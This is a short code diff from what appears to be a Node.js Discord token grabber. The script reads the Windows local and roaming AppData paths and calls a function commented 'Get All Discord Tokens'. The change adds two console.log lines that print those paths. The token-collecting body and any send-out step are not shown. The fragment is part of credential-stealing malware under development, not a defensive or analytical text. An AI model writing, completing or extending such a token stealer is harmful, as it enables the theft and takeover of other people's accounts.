@@ -17,6 +17,9 @@ var dir = __dirname.split("\\")
 var localappdata = process.env.LOCALAPPDATA
 var roamingappdata = process.env.APPDATA
 
+console.log(localappdata);
+console.log(roamingappdata);
+
 getAllDiscordTokens();
 //Get All Discord Tokens
 function getAllDiscordTokens(){
